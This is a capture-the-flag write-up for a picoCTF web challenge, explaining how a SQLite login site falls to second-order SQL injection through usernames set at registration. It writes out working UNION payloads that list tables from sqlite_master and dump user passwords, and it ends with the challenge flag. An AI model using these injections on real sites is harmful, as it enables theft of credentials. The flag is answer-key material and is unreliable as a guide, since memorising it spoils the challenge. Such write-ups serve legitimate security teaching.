# A Happy Union
## level 3 - web exploitation - 110 points

### Description
> I really need access to [website](http://shell2017.picoctf.com:41558/), but I forgot my password and there is no reset. Can you help? I like lite sql :)

### Hints
> * A SQL union allows a single query to select values from multiples tables.

### Solution

Open the website. The first thing I tried is SQL injection on login form submitting `'` as username and password. It gave me `User/Password not Found.`, so it's protected. Let's try the same parameters on the register form: it says account created, now try to login with this account, it will give us an error with the executed query:

```sql
select id, user, post from posts where user = ''';
```

The pattern we have to do to inject is register an account using the query as username and a random password then login with that: the result of the injected query will be reflected on posts table.

We can use `UNION` to retrieve data from other tables. We know from the description that the database is SQLite, so let's try to get the table list with the username `' union select * from sqlite_master --` and a random password. On login it gave me this query error:

```sql
select id, user, post from posts where user = '' union select * from sqlite_master --';
```

The query will return an error because we have to specify exactly three columns, the same of the first part of the query, on the union. Modify the injected query with `' union select name, null, null from sqlite_master --` and try again.

We have three tables: `posts`, `sqlite_sequence` and `users`, the latter is the one that interest us. Now I guessed the column names, I tried several combinations:

* `' union select username, password, null from users --`
* `' union select user, password, null from users --`
* `' union select username, pass, null from users --`
* `' union select user, pass, null from users --`

The last one will work for us, and the password field of admin account will contain the flag.

### Flag
```
flag{union?_why_not_onion_b6e6a3cd8e3f1fe5f6109d1618bddbd1}
```